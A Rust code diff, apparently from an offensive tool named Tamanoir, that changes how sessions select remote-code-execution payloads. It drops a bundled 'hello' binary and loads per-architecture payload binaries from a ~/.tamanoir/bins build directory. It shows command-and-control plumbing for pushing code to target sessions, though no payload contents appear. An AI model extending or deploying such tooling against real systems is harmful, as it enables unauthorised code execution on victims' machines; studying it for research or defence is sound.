@@ -15,6 +15,7 @@ use std::{
     sync::Arc,
 };
 
+use home::home_dir;
 use serde::Deserialize;
 use tokio::sync::{
     broadcast::{self, Sender},
@@ -27,9 +28,8 @@ const AR_HEADER_LEN: usize = 12;
 const FOOTER_TXT: &str = "r10n4m4t/";
 const FOOTER_EXTRA_BYTES: usize = 3;
 const FOOTER_LEN: usize = FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;
-const HELLO_X86_64: &[u8] = include_bytes!("../../assets/examples/bins/hello_x86_64.bin");
 
-#[derive(Debug, Clone, PartialEq)]
+#[derive(Debug, Clone, PartialEq, Deserialize)]
 pub enum TargetArch {
     X86_64,
     Aarch64,
@@ -136,6 +136,8 @@ impl KeyMap {
 
 #[derive(Debug, Deserialize, Clone)]
 pub struct SessionRcePayload {
+    name: String,
+    target_arch: TargetArch,
     length: usize,
     buffer: Vec<u8>,
 }
@@ -169,23 +171,26 @@ impl Session {
             ));
         }
         match target_arch {
-            TargetArch::X86_64 => match &*rce {
-                "hello" => {
-                    self.rce_payload = Some(SessionRcePayload {
-                        length: HELLO_X86_64.len(),
-                        buffer: HELLO_X86_64.to_vec(),
-                    });
-                    Ok(())
-                }
-                s => {
-                    let data: Vec<u8> = fs::read(s).map_err(|e| format!("{}", e))?;
-                    self.rce_payload = Some(SessionRcePayload {
-                        length: data.len(),
-                        buffer: data,
-                    });
-                    Ok(())
-                }
-            },
+            TargetArch::X86_64 => {
+                let mut build_dir = home_dir().unwrap();
+                build_dir.push(".tamanoir/bins");
+
+                let bin_name = format!("tamanoir-rce-{}_x86_64.bin", rce);
+
+                let data: Vec<u8> = fs::read(build_dir.join(bin_name)).map_err(|_| {
+                    format!(
+                        "rce {} not found in build directory, you may need to (re)build it",
+                        rce
+                    )
+                })?;
+                self.rce_payload = Some(SessionRcePayload {
+                    name: rce.into(),
+                    target_arch: TargetArch::X86_64,
+                    length: data.len(),
+                    buffer: data,
+                });
+                Ok(())
+            }
             _ => Err(format!("target arch {:#?} unavailable", target_arch)),
         }
     }
